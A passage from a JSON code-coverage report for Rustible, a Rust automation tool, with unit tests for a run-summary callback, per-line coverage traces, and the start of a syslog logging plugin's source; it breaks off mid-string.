assert_eq!(callback.suggested_exit_code(), 2);\n    }\n\n    #[tokio::test]\n    async fn test_summary_callback_failures_and_unreachable() {\n        let callback = SummaryCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        let failed_result =\n            create_execution_result(\"host1\", \"task1\", false, false, false, \"failed\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        callback\n            .on_host_unreachable(\"host2\", \"gather_facts\", \"Connection refused\")\n            .await;\n\n        assert!(callback.has_failures());\n        assert!(callback.has_unreachable());\n        assert_eq!(callback.suggested_exit_code(), 3);\n    }\n\n    #[test]\n    fn test_format_duration() {\n        assert_eq!(\n            SummaryCallback::format_duration(Duration::from_secs(30)),\n            \"30.000s\"\n        );\n        assert_eq!(\n            SummaryCallback::format_duration(Duration::from_secs(90)),\n            \"1m 30.000s\"\n        );\n        assert_eq!(\n            SummaryCallback::format_duration(Duration::from_secs(3700)),\n            \"1h 01m 40s\"\n        );\n    }\n\n    #[test]\n    fn test_aggregate_stats_from_host_stats() {\n        let mut stats = HashMap::new();\n        stats.insert(\n            \"host1\".to_string(),\n            HostStats {\n                ok: 5,\n                changed: 2,\n                failed: 1,\n                skipped: 0,\n                unreachable: 0,\n            },\n        );\n        stats.insert(\n            \"host2\".to_string(),\n            HostStats {\n                ok: 3,\n                changed: 1,\n                failed: 0,\n                skipped: 2,\n                unreachable: 1,\n            },\n        );\n\n        let agg = AggregateStats::from_host_stats(\u0026stats);\n\n        assert_eq!(agg.ok, 8);\n        assert_eq!(agg.changed, 3);\n        assert_eq!(agg.failed, 1);\n        assert_eq!(agg.skipped, 2);\n        assert_eq!(agg.unreachable, 1);\n        assert_eq!(agg.host_count, 2);\n        assert_eq!(agg.suggested_exit_code(), 3); // Both failures and unreachable\n    }\n\n    #[test]\n    fn test_builder() {\n        let callback = SummaryCallbackBuilder::new()\n            .show_host_details(false)\n            .show_timing(false)\n            .compact_mode(true)\n            .use_colors(false)\n            .build();\n\n        assert!(!callback.config.show_host_details);\n        assert!(!callback.config.show_timing);\n        assert!(callback.config.compact_mode);\n        assert!(!callback.config.use_colors);\n    }\n\n    #[test]\n    fn test_config_presets() {\n        let minimal = SummaryConfig::minimal();\n        assert!(!minimal.show_host_details);\n        assert!(minimal.compact_mode);\n\n        let machine = SummaryConfig::machine();\n        assert!(!machine.use_colors);\n        assert!(machine.show_host_details);\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = SummaryCallback::new();\n        let callback2 = callback1.clone();\n\n        // Both should share the same underlying state\n        assert!(Arc::ptr_eq(\u0026callback1.state, \u0026callback2.state));\n    }\n\n    #[test]\n    fn test_default_config() {\n        let config = SummaryConfig::default();\n\n        assert!(config.show_host_details);\n        assert!(config.show_timing);\n        assert!(config.show_exit_code_hint);\n        assert!(!config.compact_mode);\n        assert!(config.use_colors);\n        assert!(config.show_totals);\n        assert!(config.show_task_count);\n    }\n\n    #[tokio::test]\n    async fn test_playbook_resets_state() {\n        let callback = SummaryCallback::new();\n\n        // First playbook\n        callback.on_playbook_start(\"playbook1\").await;\n        callback\n            .on_play_start(\"play1\", \u0026[\"host1\".to_string()])\n            .await;\n        let result = create_execution_result(\"host1\", \"task1\", true, true, false, \"ok\");\n        callback.on_task_complete(\u0026result).await;\n\n        // Second playbook should reset state\n        callback.on_playbook_start(\"playbook2\").await;\n\n        let (ok, changed, failed, skipped, unreachable) = callback.aggregate_stats();\n        assert_eq!(ok, 0);\n        assert_eq!(changed, 0);\n        assert_eq!(failed, 0);\n        assert_eq!(skipped, 0);\n        assert_eq!(unreachable, 0);\n    }\n}\n","traces":[{"line":121,"address":[29530160],"length":1,"stats":{"Line":1}},{"line":137,"address":[29508512],"length":1,"stats":{"Line":1}},{"line":151,"address":[29508464],"length":1,"stats":{"Line":1}},{"line":187,"address":[29529136],"length":1,"stats":{"Line":0}},{"line":188,"address":[29529248,29529150],"length":1,"stats":{"Line":0}},{"line":192,"address":[29529264],"length":1,"stats":{"Line":1}},{"line":193,"address":[29529269],"length":1,"stats":{"Line":1}},{"line":197,"address":[29529280],"length":1,"stats":{"Line":1}},{"line":198,"address":[29529285],"length":1,"stats":{"Line":1}},{"line":225,"address":[29508688],"length":1,"stats":{"Line":1}},{"line":227,"address":[29508726],"length":1,"stats":{"Line":1}},{"line":231,"address":[29508804,29509206],"length":1,"stats":{"Line":2}},{"line":232,"address":[29508937,29509019,29509044],"length":1,"stats":{"Line":2}},{"line":233,"address":[29509066,29509091,29509023],"length":1,"stats":{"Line":2}},{"line":234,"address":[29509070,29509113,29509138],"length":1,"stats":{"Line":2}},{"line":235,"address":[29509185,29509117,29509160],"length":1,"stats":{"Line":2}},{"line":236,"address":[29509211,29509164,29509202],"length":1,"stats":{"Line":2}},{"line":239,"address":[29508967],"length":1,"stats":{"Line":1}},{"line":243,"address":[29509232],"length":1,"stats":{"Line":1}},{"line":244,"address":[29509237],"length":1,"stats":{"Line":1}},{"line":245,"address":[29509309],"length":1,"stats":{"Line":1}},{"line":246,"address":[29509286],"length":1,"stats":{"Line":1}},{"line":247,"address":[29509299],"length":1,"stats":{"Line":1}},{"line":248,"address":[29509276],"length":1,"stats":{"Line":1}},{"line":253,"address":[29508560],"length":1,"stats":{"Line":0}},{"line":254,"address":[29508574,29508673],"length":1,"stats":{"Line":0}},{"line":281,"address":[29508439,29508176],"length":1,"stats":{"Line":1}},{"line":282,"address":[29508190],"length":1,"stats":{"Line":1}},{"line":283,"address":[29508204],"length":1,"stats":{"Line":1}},{"line":284,"address":[29508221,29508242],"length":1,"stats":{"Line":1}},{"line":285,"address":[29508311],"length":1,"stats":{"Line":1}},{"line":286,"address":[29508315],"length":1,"stats":{"Line":1}},{"line":287,"address":[29508357,29508332],"length":1,"stats":{"Line":1}},{"line":328,"address":[29528288],"length":1,"stats":{"Line":1}},{"line":330,"address":[29528304],"length":1,"stats":{"Line":1}},{"line":331,"address":[29528314],"length":1,"stats":{"Line":1}},{"line":337,"address":[29509328],"length":1,"stats":{"Line":1}},{"line":340,"address":[29509350],"length":1,"stats":{"Line":1}},{"line":346,"address":[29528464],"length":1,"stats":{"Line":0}},{"line":347,"address":[29528478],"length":1,"stats":{"Line":0}},{"line":352,"address":[29528400],"length":1,"stats":{"Line":0}},{"line":353,"address":[29528414],"length":1,"stats":{"Line":0}},{"line":357,"address":[29509577,29509440,29509583],"length":1,"stats":{"Line":1}},{"line":358,"address":[29509449],"length":1,"stats":{"Line":1}},{"line":359,"address":[29509479,29509524],"length":1,"stats":{"Line":4}},{"line":363,"address":[29515776,29515919,29515913],"length":1,"stats":{"Line":1}},{"line":364,"address":[29515785],"length":1,"stats":{"Line":1}},{"line":365,"address":[29515815,29515860],"length":1,"stats":{"Line":4}},{"line":374,"address":[29522464,29522605,29522599],"length":1,"stats":{"Line":1}},{"line":375,"address":[29522473],"length":1,"stats":{"Line":1}},{"line":376,"address":[29522548,29522503],"length":1,"stats":{"Line":2}},{"line":377,"address":[29522569],"length":1,"stats":{"Line":1}},{"line":381,"address":[29528659,29528528,29528665],"length":1,"stats":{"Line":0}},{"line":382,"address":[29528537],"length":1,"stats":{"Line":0}},{"line":383,"address":[30493936,30493948],"length":1,"stats":{"Line":0}},{"line":387,"address":[29514712,29514718,29514528],"length":1,"stats":{"Line":1}},{"line":388,"address":[29514560],"length":1,"stats":{"Line":1}},{"line":389,"address":[29514590,29514635],"length":1,"stats":{"Line":2}},{"line":391,"address":[29514656],"length":1,"stats":{"Line":1}},{"line":392,"address":[29514661],"length":1,"stats":{"Line":1}},{"line":393,"address":[29514665],"length":1,"stats":{"Line":1}},{"line":394,"address":[29514669],"length":1,"stats":{"Line":1}},{"line":395,"address":[29514673],"length":1,"stats":{"Line":1}},{"line":404,"address":[29514736],"length":1,"stats":{"Line":1}},{"line":405,"address":[29514762],"length":1,"stats":{"Line":1}},{"line":406,"address":[29514777],"length":1,"stats":{"Line":1}},{"line":408,"address":[29514791],"length":1,"stats":{"Line":1}},{"line":409,"address":[29514819],"length":1,"stats":{"Line":1}},{"line":410,"address":[29514839],"length":1,"stats":{"Line":1}},{"line":411,"address":[29514872],"length":1,"stats":{"Line":1}},{"line":412,"address":[29514892],"length":1,"stats":{"Line":1}},{"line":413,"address":[29514802],"length":1,"stats":{"Line":1}},{"line":414,"address":[29515407],"length":1,"stats":{"Line":1}},{"line":415,"address":[29515430],"length":1,"stats":{"Line":1}},{"line":416,"address":[29515453],"length":1,"stats":{"Line":1}},{"line":418,"address":[29515180],"length":1,"stats":{"Line":1}},{"line":423,"address":[29519849,29519568,29519843],"length":1,"stats":{"Line":0}},{"line":424,"address":[29519583],"length":1,"stats":{"Line":0}},{"line":425,"address":[29519862,29519656],"length":1,"stats":{"Line":0}},{"line":427,"address":[29519711,29519589],"length":1,"stats":{"Line":0}},{"line":432,"address":[29510167,29510161,29509600],"length":1,"stats":{"Line":0}},{"line":433,"address":[29509630],"length":1,"stats":{"Line":0}},{"line":435,"address":[29509640],"length":1,"stats":{"Line":0}},{"line":436,"address":[29509755],"length":1,"stats":{"Line":0}},{"line":442,"address":[29509646],"length":1,"stats":{"Line":0}},{"line":445,"address":[29509842],"length":1,"stats":{"Line":0}},{"line":446,"address":[29509847],"length":1,"stats":{"Line":0}},{"line":450,"address":[29510802,29510192,29510796],"length":1,"stats":{"Line":0}},{"line":451,"address":[29510230],"length":1,"stats":{"Line":0}},{"line":453,"address":[29510282],"length":1,"stats":{"Line":0}},{"line":454,"address":[29510401],"length":1,"stats":{"Line":0}},{"line":455,"address":[29510454],"length":1,"stats":{"Line":0}},{"line":457,"address":[29510415],"length":1,"stats":{"Line":0}},{"line":459,"address":[29510571,29510491],"length":1,"stats":{"Line":0}},{"line":461,"address":[29510288],"length":1,"stats":{"Line":0}},{"line":466,"address":[29511421,29511427,29510816],"length":1,"stats":{"Line":0}},{"line":467,"address":[29510860],"length":1,"stats":{"Line":0}},{"line":471,"address":[29510883],"length":1,"stats":{"Line":0}},{"line":473,"address":[29510898],"length":1,"stats":{"Line":0}},{"line":474,"address":[29511116,29511190],"length":1,"stats":{"Line":0}},{"line":480,"address":[29511008,29510909],"length":1,"stats":{"Line":0}},{"line":485,"address":[29520096,29521317,29521323],"length":1,"stats":{"Line":0}},{"line":486,"address":[29520129],"length":1,"stats":{"Line":0}},{"line":490,"address":[29520148],"length":1,"stats":{"Line":0}},{"line":491,"address":[29520426,29520482,29520592],"length":1,"stats":{"Line":0}},{"line":496,"address":[29520983,29520914,29521061],"length":1,"stats":{"Line":0}},{"line":502,"address":[29520163],"length":1,"stats":{"Line":0}},{"line":503,"address":[29520293],"length":1,"stats":{"Line":0}},{"line":508,"address":[29521344,29522425,29522431],"length":1,"stats":{"Line":0}},{"line":509,"address":[29521383,29521413],"length":1,"stats":{"Line":0}},{"line":513,"address":[29521422],"length":1,"stats":{"Line":0}},{"line":514,"address":[29521465],"length":1,"stats":{"Line":0}},{"line":515,"address":[29521508,29521804],"length":1,"stats":{"Line":0}},{"line":517,"address":[29521471],"length":1,"stats":{"Line":0}},{"line":523,"address":[29521648],"length":1,"stats":{"Line":0}},{"line":526,"address":[29521693],"length":1,"stats":{"Line":0}},{"line":529,"address":[29521743],"length":1,"stats":{"Line":0}},{"line":530,"address":[29521784,29521987],"length":1,"stats":{"Line":0}},{"line":532,"address":[29521994,29522186],"length":1,"stats":{"Line":0}},{"line":533,"address":[29522254,29522299],"length":1,"stats":{"Line":0}},{"line":534,"address":[29522368],"length":1,"stats":{"Line":0}},{"line":540,"address":[29517552,29515936,29517558],"length":1,"stats":{"Line":0}},{"line":541,"address":[29515991],"length":1,"stats":{"Line":0}},{"line":543,"address":[29516569,29516596],"length":1,"stats":{"Line":0}},{"line":544,"address":[29516618,29517720],"length":1,"stats":{"Line":0}},{"line":545,"address":[29517663,29517739,29516895],"length":1,"stats":{"Line":0}},{"line":546,"address":[29517625,29517190],"length":1,"stats":{"Line":0}},{"line":548,"address":[29516913,29517489],"length":1,"stats":{"Line":0}},{"line":551,"address":[29518072],"length":1,"stats":{"Line":0}},{"line":569,"address":[29516009],"length":1,"stats":{"Line":0}},{"line":583,"address":[29513801,29511440,29513795],"length":1,"stats":{"Line":0}},{"line":584,"address":[29511473],"length":1,"stats":{"Line":0}},{"line":588,"address":[29511487],"length":1,"stats":{"Line":0}},{"line":589,"address":[29511521],"length":1,"stats":{"Line":0}},{"line":590,"address":[29512532,29512356,29512464],"length":1,"stats":{"Line":0}},{"line":608,"address":[29511536],"length":1,"stats":{"Line":0}},{"line":616,"address":[29523376,29522624,29523382],"length":1,"stats":{"Line":0}},{"line":617,"address":[29522657],"length":1,"stats":{"Line":0}},{"line":621,"address":[29522671],"length":1,"stats":{"Line":0}},{"line":623,"address":[29522716],"length":1,"stats":{"Line":0}},{"line":624,"address":[29522728],"length":1,"stats":{"Line":0}},{"line":625,"address":[29522796],"length":1,"stats":{"Line":0}},{"line":626,"address":[29522825],"length":1,"stats":{"Line":0}},{"line":627,"address":[29522854],"length":1,"stats":{"Line":0}},{"line":628,"address":[29522883],"length":1,"stats":{"Line":0}},{"line":629,"address":[29522767],"length":1,"stats":{"Line":0}},{"line":632,"address":[29522915],"length":1,"stats":{"Line":0}},{"line":633,"address":[29523113],"length":1,"stats":{"Line":0}},{"line":634,"address":[29523123,29523282],"length":1,"stats":{"Line":0}},{"line":636,"address":[29523446,29523175],"length":1,"stats":{"Line":0}},{"line":639,"address":[29523342],"length":1,"stats":{"Line":0}},{"line":646,"address":[29522925],"length":1,"stats":{"Line":0}},{"line":651,"address":[29527845,29523872,29526901],"length":1,"stats":{"Line":0}},{"line":657,"address":[29523961],"length":1,"stats":{"Line":0}},{"line":658,"address":[29524060,29523997],"length":1,"stats":{"Line":0}},{"line":660,"address":[29524086],"length":1,"stats":{"Line":0}},{"line":661,"address":[29524171],"length":1,"stats":{"Line":0}},{"line":662,"address":[29524213,29524286],"length":1,"stats":{"Line":0}},{"line":664,"address":[29524293],"length":1,"stats":{"Line":0}},{"line":665,"address":[29524481],"length":1,"stats":{"Line":0}},{"line":666,"address":[29524962,29525061],"length":1,"stats":{"Line":0}},{"line":668,"address":[29524997,29524927],"length":1,"stats":{"Line":0}},{"line":671,"address":[29525571,29525669],"length":1,"stats":{"Line":0}},{"line":696,"address":[29524494,29524303],"length":1,"stats":{"Line":0}},{"line":712,"address":[29527872,29528266,29528260],"length":1,"stats":{"Line":0}},{"line":718,"address":[29527934],"length":1,"stats":{"Line":0}},{"line":719,"address":[29528018,29527964],"length":1,"stats":{"Line":0}},{"line":721,"address":[29528049],"length":1,"stats":{"Line":0}},{"line":722,"address":[29528065],"length":1,"stats":{"Line":0}},{"line":724,"address":[29528078],"length":1,"stats":{"Line":0}},{"line":725,"address":[29528158,29528134],"length":1,"stats":{"Line":0}},{"line":728,"address":[29528151],"length":1,"stats":{"Line":0}},{"line":729,"address":[29528165],"length":1,"stats":{"Line":0}},{"line":730,"address":[29528206],"length":1,"stats":{"Line":0}},{"line":731,"address":[29528223],"length":1,"stats":{"Line":0}},{"line":733,"address":[29528235],"length":1,"stats":{"Line":0}},{"line":737,"address":[29513824,29514509,29514515],"length":1,"stats":{"Line":0}},{"line":738,"address":[29514214],"length":1,"stats":{"Line":0}},{"line":739,"address":[29513844],"length":1,"stats":{"Line":0}},{"line":741,"address":[29513880],"length":1,"stats":{"Line":0}},{"line":743,"address":[29513937],"length":1,"stats":{"Line":0}},{"line":744,"address":[30493804,30493792],"length":1,"stats":{"Line":0}},{"line":745,"address":[29513994,29514055],"length":1,"stats":{"Line":0}},{"line":746,"address":[30493760,30493772],"length":1,"stats":{"Line":0}},{"line":750,"address":[29514313],"length":1,"stats":{"Line":0}},{"line":751,"address":[29514494,29514346],"length":1,"stats":{"Line":0}},{"line":753,"address":[29514432,29514324],"length":1,"stats":{"Line":0}},{"line":759,"address":[29530336],"length":1,"stats":{"Line":0}},{"line":760,"address":[29530344],"length":1,"stats":{"Line":0}},{"line":765,"address":[29529712],"length":1,"stats":{"Line":1}},{"line":767,"address":[29529736],"length":1,"stats":{"Line":1}},{"line":768,"address":[29529755],"length":1,"stats":{"Line":1}},{"line":780,"address":[30481564,30481536,30481656,30482196,30482241,30481629],"length":1,"stats":{"Line":4}},{"line":781,"address":[30481700,30481617],"length":1,"stats":{"Line":2}},{"line":782,"address":[30481734,30481785],"length":1,"stats":{"Line":2}},{"line":783,"address":[30481792],"length":1,"stats":{"Line":1}},{"line":784,"address":[30482051,30482212,30481900,30481873,30481989],"length":1,"stats":{"Line":1}},{"line":785,"address":[30482158],"length":1,"stats":{"Line":1}},{"line":790,"address":[29506507],"length":1,"stats":{"Line":0}},{"line":792,"address":[30480493,30480567],"length":1,"stats":{"Line":0}},{"line":793,"address":[30480601,30480650],"length":1,"stats":{"Line":0}},{"line":797,"address":[30480673],"length":1,"stats":{"Line":0}},{"line":801,"address":[29506365],"length":1,"stats":{"Line":4}},{"line":802,"address":[30479473,30479556],"length":1,"stats":{"Line":2}},{"line":803,"address":[30479701,30479590,30479641],"length":1,"stats":{"Line":2}},{"line":804,"address":[30479674,30479876,30480263,30479810,30479721],"length":1,"stats":{"Line":1}},{"line":807,"address":[30479985],"length":1,"stats":{"Line":1}},{"line":808,"address":[30480189,30480134],"length":1,"stats":{"Line":2}},{"line":814,"address":[29506299],"length":1,"stats":{"Line":0}},{"line":819,"address":[29506445],"length":1,"stats":{"Line":0}},{"line":824,"address":[29506558],"length":1,"stats":{"Line":4}},{"line":825,"address":[30480809,30480892],"length":1,"stats":{"Line":2}},{"line":826,"address":[30480926,30480982],"length":1,"stats":{"Line":2}},{"line":829,"address":[30481074,30481374],"length":1,"stats":{"Line":2}},{"line":830,"address":[30481112,30481371,30481379],"length":1,"stats":{"Line":2}},{"line":831,"address":[30481092],"length":1,"stats":{"Line":1}},{"line":832,"address":[30481142,30481209,30481189],"length":1,"stats":{"Line":2}},{"line":833,"address":[30481197,30481234],"length":1,"stats":{"Line":2}},{"line":834,"address":[30481339,30481165,30481308],"length":1,"stats":{"Line":3}},{"line":835,"address":[30481341,30481336,30481280],"length":1,"stats":{"Line":2}},{"line":837,"address":[30481258,30481306,30481310],"length":1,"stats":{"Line":2}},{"line":843,"address":[29506739],"length":1,"stats":{"Line":0}},{"line":848,"address":[29506616],"length":1,"stats":{"Line":0}},{"line":866,"address":[29506812],"length":1,"stats":{"Line":4}},{"line":867,"address":[30490569,30490652],"length":1,"stats":{"Line":2}},{"line":868,"address":[30490686,30490742],"length":1,"stats":{"Line":2}},{"line":869,"address":[30490833,30490878],"length":1,"stats":{"Line":1}},{"line":870,"address":[30490866,30490903],"length":1,"stats":{"Line":2}},{"line":887,"address":[29529056],"length":1,"stats":{"Line":1}},{"line":888,"address":[29529064],"length":1,"stats":{"Line":1}},{"line":892,"address":[29528960],"length":1,"stats":{"Line":1}},{"line":893,"address":[29528974],"length":1,"stats":{"Line":1}},{"line":894,"address":[29528980],"length":1,"stats":{"Line":1}},{"line":898,"address":[29528736],"length":1,"stats":{"Line":1}},{"line":899,"address":[29528750],"length":1,"stats":{"Line":1}},{"line":900,"address":[29528756],"length":1,"stats":{"Line":1}},{"line":904,"address":[29529008],"length":1,"stats":{"Line":0}},{"line":905,"address":[29529022],"length":1,"stats":{"Line":0}},{"line":906,"address":[29529028],"length":1,"stats":{"Line":0}},{"line":910,"address":[29528832],"length":1,"stats":{"Line":1}},{"line":911,"address":[29528846],"length":1,"stats":{"Line":1}},{"line":912,"address":[29528852],"length":1,"stats":{"Line":1}},{"line":916,"address":[29528688],"length":1,"stats":{"Line":1}},{"line":917,"address":[29528702],"length":1,"stats":{"Line":1}},{"line":918,"address":[29528708],"length":1,"stats":{"Line":1}},{"line":922,"address":[29528928],"length":1,"stats":{"Line":0}},{"line":923,"address":[29528936],"length":1,"stats":{"Line":0}},{"line":924,"address":[29528939],"length":1,"stats":{"Line":0}},{"line":928,"address":[29528784],"length":1,"stats":{"Line":0}},{"line":929,"address":[29528798],"length":1,"stats":{"Line":0}},{"line":930,"address":[29528804],"length":1,"stats":{"Line":0}},{"line":934,"address":[29528880],"length":1,"stats":{"Line":0}},{"line":935,"address":[29528894],"length":1,"stats":{"Line":0}},{"line":936,"address":[29528900],"length":1,"stats":{"Line":0}},{"line":940,"address":[29529088],"length":1,"stats":{"Line":1}},{"line":941,"address":[29529099],"length":1,"stats":{"Line":1}}],"covered":112,"coverable":256},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","syslog.rs"],"content":"//! Syslog Callback Plugin for Rustible.\n//!\n//! This plugin logs execution events to the system syslog daemon,\n//! providing integration with centralized logging infrastructure.\n//!\n//! # Features\n//!\n//! - Configurable syslog facility (local0-local7, daemon, user, etc.)\n//! - Configurable priority/severity levels per event type\n//! - Structured log format with JSON support\n//! - Works on Linux/Unix systems via the native syslog API\n//! - Thread-safe design for concurrent task execution\n//!\n//! # Example Output (in /var/log/syslog or similar)\n//!\n//! ```text\n//! Dec 25 10:30:15 server rustible[12345]: {\"event\":\"playbook_start\",\"name\":\"deploy.yml\",\"timestamp\":\"2025-12-25T10:30:15Z\"}\n//! Dec 25 10:30:16 server rustible[12345]: {\"event\":\"task_complete\",\"task\":\"Install nginx\",\"host\":\"web1\",\"status\":\"changed\",\"duration_ms\":1523}\n//! Dec 25 10:30:17 server rustible[12345]: {\"event\":\"task_complete\",\"task\":\"Configure nginx\",\"host\":\"web1\",\"status\":\"failed\",\"error\":\"File not found\"}\n//! ```\n//!\n//! # Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::{SyslogCallback, SyslogConfig, SyslogFacility};\n//!\n//! let config = SyslogConfig::builder()\n//!     .facility(SyslogFacility::Local0)\n//!     .ident(\"rustible\")\n//!     .include_host(true)\n//!     .build();\n//!\n//! let callback = SyslogCallback::new(config)?;\n//! executor.with_callback(Box::new(callback));\n//! ```\n\nuse std::collections::HashMap;\nuse std::io::{self, Write};\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse chrono::Utc;\nuse parking_lot::RwLock;\nuse serde::Serialize;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n// ============================================================================\n// Syslog Facility and Priority Definitions\n// ============================================================================\n\n/// Syslog facility codes as defined in RFC 5424.\n///\n/// Facilities allow categorizing log messages by source type.\n/// For application-specific logging, use `Local0` through `Local7`.\n#[derive(Debug, Clone, Copy, PartialEq, Eq)]\n#[repr(u8)]\npub enum SyslogFacility {\n    /// Kernel messages\n    Kern = 0,\n    /// User-level messages\n    User = 1,\n    /// Mail system\n    Mail = 2,\n    /// System daemons\n    Daemon = 3,\n    /// Security/authorization messages\n    Auth = 4,\n    /// Messages generated internally by syslogd\n    Syslog = 5,\n    /// Line printer subsystem\n    Lpr = 6,\n    /// Network news subsystem\n    News = 7,\n    /// UUCP subsystem\n    Uucp = 8,\n    /// Clock daemon\n    Cron = 9,\n    /// Security/authorization messages (private)\n    AuthPriv = 10,\n    /// FTP daemon\n    Ftp = 11,\n    /// NTP subsystem\n    Ntp = 12,\n    /// Log audit\n    LogAudit = 13,\n    /// Log alert\n    LogAlert = 14,\n    /// Clock daemon (note 2)\n    Clock = 15,\n    /// Local use 0 (recommended for applications)\n    Local0 = 16,\n    /// Local use 1\n    Local1 = 17,\n    /// Local use 2\n    Local2 = 18,\n    /// Local use 3\n    Local3 = 19,\n    /// Local use 4\n    Local4 = 20,\n    /// Local use 5\n    Local5 = 21,\n    /// Local use 6\n    Local6 = 22,\n    /// Local use 7\n    Local7 = 23,\n}\n\nimpl Default for SyslogFacility {\n    fn default() -\u003e Self {\n        SyslogFacility::Local0\n    }\n}\n\nimpl std::fmt::Display for SyslogFacility {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        match self {\n            SyslogFacility::Kern =\u003e write!(f, \"kern\"),\n            SyslogFacility::User =\u003e write!(f, \"user\"),\n            SyslogFacility::Mail =\u003e write!(f, \"mail\"),\n            SyslogFacility::Daemon =\u003e write!(f, \"daemon\"),\n            SyslogFacility::Auth =\u003e write!(f, \"auth\"),\n            SyslogFacility::Syslog =\u003e write!(f, \"syslog\"),\n            SyslogFacility::Lpr =\u003e write!(f, \"lpr\"),\n            SyslogFacility::News =\u003e write!(f, \"news\"),\n            SyslogFacility::Uucp =\u003e write!(f, \"uucp\"),\n            SyslogFacility::Cron =\u003e write!(f, \"cron\"),\n            SyslogFacility::AuthPriv =\u003e write!(f, \"authpriv\"),\n            SyslogFacility::Ftp =\u003e write!(f, \"ftp\"),\n            SyslogFacility::Ntp =\u003e write!(f, \"ntp\"),\n            SyslogFacility::LogAudit =\u003e write!(f, \"logaudit\"),\n            SyslogFacility::LogAlert =\u003e write!(f, \"logalert\"),\n            SyslogFacility::Clock =\u003e write!(f, \"clock\"),\n            SyslogFacility::Local0 =\u003e write!(f, \"local0\"),\n            SyslogFacility::Local1 =\u003e write!(f, \"local1\"),\n            SyslogFacility::Local2 =\u003e write!(f, \"local2\"),\n            SyslogFacility::Local3 =\u003e write!(f, \"local3\"),\n            SyslogFacility::Local4 =\u003e write!(f, \"local4\"),\n            SyslogFacility::Local5 =\u003e write!(f, \"local5\"),\n            SyslogFacility::Local6 =\u003e write!(f, \"local6\"),\n            SyslogFacility::Local7 =\u003e write!(f, \"local7\"),\n        }\n    }\n}\n\nimpl std::str::FromStr for SyslogFacility {\n    type Err = SyslogError;\n\n    fn from_str(s: \u0026str) -\u003e Result\u003cSelf, Self::Err\u003e {\n        match s.to_lowercase().as_str() {\n            \"kern\" | \"kernel\" =\u003e Ok(SyslogFacility::Kern),\n            \"user\" =\u003e Ok(SyslogFacility::User),\n            \"mail\" =\u003e Ok(SyslogFacility::Mail),\n            \"daemon\" =\u003e Ok(SyslogFacility::Daemon),\n            \"auth\" =\u003e Ok(SyslogFacility::Auth),\n            \"syslog\" =\u003e Ok(SyslogFacility::Syslog),\n            \"lpr\" =\u003e Ok(SyslogFacility::Lpr),\n            \"news\" =\u003e Ok(SyslogFacility::News),\n            \"uucp\" =\u003e Ok(SyslogFacility::Uucp),\n            \"cron\" =\u003e Ok(SyslogFacility::Cron),\n            \"authpriv\" =\u003e Ok(SyslogFacility::AuthPriv),\n            \"ftp\" =\u003e Ok(SyslogFacility::Ftp),\n            \"ntp\" =\u003e Ok(SyslogFacility::Ntp),\n            \"logaudit\" =\u003e Ok(SyslogFacility::LogAudit),\n            \"logalert\" =\u003e Ok(SyslogFacility::LogAlert),\n            \"clock\" =\u003e Ok(SyslogFacility::Clock),\n            \"local0\" =\u003e Ok(SyslogFacility::Local0),\n            \"local1\" =\u003e Ok(SyslogFacility::Local1),\n            \"local2\" =\u003e Ok(SyslogFacility::Local2),\n            \"local3\" =\u003e Ok(SyslogFacility::Local3),\n            \"local4\" =\u003e Ok(SyslogFacility::Local4),\n            \"local5\" =\u003e Ok(SyslogFacility::Local5),\n            \"local6\" =\u003e Ok(SyslogFacility::Local6),\n            \"local7\" =\u003e Ok(SyslogFacility::Local7),\n            _ =\u003e Err(SyslogError::InvalidFacility(s.to_string())),\n        }\n    }\n}\n\n/// Syslog severity/priority levels as defined in RFC 5424.\n///\n/// Lower numbers indicate higher severity.\n#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]\n#[repr(u8)]\npub enum SyslogSeverity {\n    /// System is unusable\n    Emergency = 0,\n    /// Action must be taken immediately\n    Alert = 1,\n    /// Critical conditions\n    Critical = 2,\n    /// Error conditions\n    Error = 3,\n    /// Warning conditions\n    Warning = 4,\n    /// Normal but significant condition\n    Notice = 5,\n    /// Informational messages\n    Info = 6,\n    /// Debug-level messages\n    Debug = 7,\n}\n\nimpl Default for SyslogSeverity {\n    fn default() -\u003e Self {\n        SyslogSeverity::Info\n    }\n}\n\nimpl std::fmt::Display for SyslogSeverity {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        match self {\n            SyslogSeverity::Emergency =\u003e write!(f, \"emerg\"),\n            SyslogSeverity::Alert =\u003e write!(f, \"alert\"),\n            SyslogSeverity::Critical =\u003e write!(f, \"crit\"),\n            SyslogSeverity::Error =\u003e write!(f, \"err\"),\n            SyslogSeverity::Warning =\u003e write!(f, \"warning\"),\n            SyslogSeverity::Notice =\u003e write!(f, \"notice\"),\n            SyslogSeverity::Info =\u003e write!(f, \"info\"),\n            SyslogSeverity::Debug =\u003e write!(f, \"debug\"),\n        }\n    }\n}\n\nimpl std::str::FromStr for SyslogSeverity {\n    type Err = SyslogError;\n\n    fn from_str(s: \u0026str) -\u003e Result\u003cSelf, Self::Err\u003e {\n        match s.to_lowercase().as_str() {\n            \"emerg\" | \"emergency\" | \"panic\" =\u003e Ok(SyslogSeverity::Emergency),\n            \"alert\" =\u003e Ok(SyslogSeverity::Alert),\n            \"crit\" | \"critical\" =\u003e Ok(SyslogSeverity::Critical),\n            \"err\" | \"error\" =\u003e Ok(SyslogSeverity::Error),\n            \"warn\" | \"warning\" =\u003e Ok(SyslogSeverity::Warning),\n            \"notice\" =\u003e Ok(SyslogSeverity::Notice),\n            \"info\" | \"informational\" =\u003e Ok(SyslogSeverity::Info),\n            \"debug\" =\u003e Ok(SyslogSeverity::Debug),\n            _ =\u003e Err(SyslogError::InvalidSeverity(s.to_string())),\n        }\n    }\n}\n\n// ============================================================================\n// Error Types\n// ============================================================================\n\n/// Errors that can occur during syslog operations.\n#[derive(Debug, thiserror::Error)]\npub enum SyslogError {\n    /// Failed to open syslog connection\n    #[error(\"Failed 